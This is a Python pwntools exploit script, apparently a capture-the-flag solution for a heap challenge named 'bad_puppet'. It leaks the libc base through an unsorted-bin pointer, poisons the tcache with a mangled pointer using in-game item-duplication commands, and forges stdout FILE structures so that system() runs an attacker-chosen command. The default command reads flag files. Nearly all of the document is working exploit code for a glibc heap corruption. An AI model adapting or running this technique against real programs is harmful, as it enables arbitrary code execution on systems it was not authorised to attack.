import sys, time
from pwn import *
from game import Game

HOST, PORT = "127.0.0.1", 28756

LIBC_STDOUT = 0x2055C0
LIBC_STDERR = 0x2054E0
LIBC_STDIN  = 0x2048E0
LIBC_WFILE  = 0x203228
UNSORTED_OFF = 0x204B20      # bin head offset seen for our free pattern

def p64(x): return (x & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
def mangle(base, target): return (target ^ (base >> 12)) & 0xFFFFFFFFFFFFFFFF

class S:
    def __init__(self, g): self.g = g
    def solve(self, drop_id=None, mirror_id=None, mirror_kind=None, tries=3, buy=False):
        g = self.g
        for t in range(tries):
            items = g.inv(); n = len(items)
            for s in range(n):
                it = items[s]; mir = n - 1 - s
                if drop_id is not None and it["id"] != drop_id: continue
                m = items[mir]
                if mirror_id is not None and m["id"] != mirror_id: continue
                if mirror_kind == "ring" and m["type"] != "Ring": continue
                if mirror_kind == "nonring" and m["type"] == "Ring": continue
                return s
            g.cmd("inv sort", 0.3)
        if buy:
            g.cmd("shop buy 1 1", 0.5)
            return self.solve(drop_id, mirror_id, mirror_kind, 2, False)
        return None

def main():
    remote_mode = len(sys.argv) > 1 and sys.argv[1] == "remote"
    cmdstr = sys.argv[2] if len(sys.argv) > 2 else "id;cat /flag*>/proc/self/fd/4"
    g = Game(host=HOST, port=PORT) if remote_mode else Game(mode="socket")
    sv = S(g)
    g.game_setup()
    print("[*] setup, rings:", sum(1 for i in g.inv() if i["type"] == "Ring"))

    made = 0
    for k in range(13):
        if g.dup_ring() is None: break
        made += 1
    rings = [i for i in g.inv() if i["type"] == "Ring"]
    print("[*] dups:", made, "rings:", len(rings))
    if len(rings) < 12: return

    for k in range(9):
        if g.equip_sell() is None: break
    eqs, _ = g.world()
    libc = None
    for e in eqs:
        for v in (e["head"], e["key"]):
            if v and 0x700000000000 <= v < 0x800000000000:
                cand = v - UNSORTED_OFF
                if cand & 0xFFF == 0: libc = cand
    print("[*] libc:", hex(libc) if libc else None)
    if not libc: return
    S_ = libc + LIBC_STDOUT
    libcel = ELF("/home/ubuntu/pwn/bp/bad_puppet/libs/libc.so.6", checksec=False)
    system = libc + libcel.symbols["system"]
    print("[*] stdout:", hex(S_), "system:", hex(system))

    cmdb = cmdstr.encode() + b"\0"
    payA = bytearray(127)
    payA[0:len(cmdb)] = cmdb
    payA[0x40:0x48] = p64(1)
    payB = bytearray(127)
    def setb(off, val): payB[off-0x80:off-0x80+8] = p64(val)
    setb(0xA0, S_ + 0x20)
    setb(0xB8, system)
    setb(0xC0, 1)
    setb(0xD0, S_ + 0x50)
    setb(0xD8, libc + LIBC_WFILE)
    setb(0xE0, libc + LIBC_STDERR)
    setb(0xE8, libc + LIBC_STDOUT)
    setb(0xF0, libc + LIBC_STDIN)

    rings = [i for i in g.inv() if i["type"] == "Ring"]
    X = rings[0]
    print("[*] X id:", X["id"])

    def equip_getring(idv):
        g.cmd("inv equip %d" % idv, 0.3)
        eqs, _ = g.world()
        return eqs

    def write_cycle(T, payload):
        # 1) equip X, whisper payload, unequip X
        g.cmd("inv equip %d" % X["idx"], 0.3)
        eqs, _ = g.world()
        xd = eqs[-1]["idx"]
        if eqs[-1]["addr"] is None:
            print("[-] X equip failed"); return False
        g.cmd("mw whisper %d %s" % (xd, bytes(payload).hex()), 0.35)
        g.cmd("inv unequip %d" % X["idx"], 0.3)
        # 2) two fill rings -> tx tcache
        dests = []
        for k in range(2):
            items = g.inv()
            cand = [i for i in items if i["type"] == "Ring" and i["id"] != X["id"]]
            if not cand: print("[-] no fill ring"); return False
            R = cand[0]
            g.cmd("inv equip %d" % R["idx"], 0.3)
            eqs, _ = g.world()
            if eqs[-1]["addr"] is None: print("[-] fill equip failed"); return False
            dests.append((eqs[-1]["idx"], eqs[-1]["addr"]))
            s = sv.solve(drop_id=R["id"], mirror_kind="nonring", buy=True)
            if s is None: print("[-] no fill slot"); return False
            if not g.stale_drop(s): print("[-] fill stale fail"); return False
            print("    fill dest=%d id=%d" % (dests[-1][0], R["id"]))
        # 3) poison tcache head (2nd freed ring)
        hd, ha = dests[1]
        j = bytearray(127)
        j[0:8] = p64(mangle(ha, T))
        g.cmd("mw whisper %d %s" % (hd, bytes(j).hex()), 0.35)
        # 4) two dup events: clone X twice
        for k in range(2):
            s = sv.solve(mirror_id=X["id"], mirror_kind="ring", buy=True)
            if s is None: print("[-] no dup slot"); return False
            if not g.stale_drop(s): print("[-] dup stale fail"); return False
        return True

    print("[*] cycle A")
    write_cycle(S_, bytes(payA))
    print("[*] cycle B")
    write_cycle(S_ + 0x80, bytes(payB))
    print("[*] quit")
    g.cmd("quit", 0.4)
    d = g.drain(2.0)
    print("=== OUT ===")
    sys.stdout.write(d.decode(errors="replace"))
    sys.stdout.flush()

main()
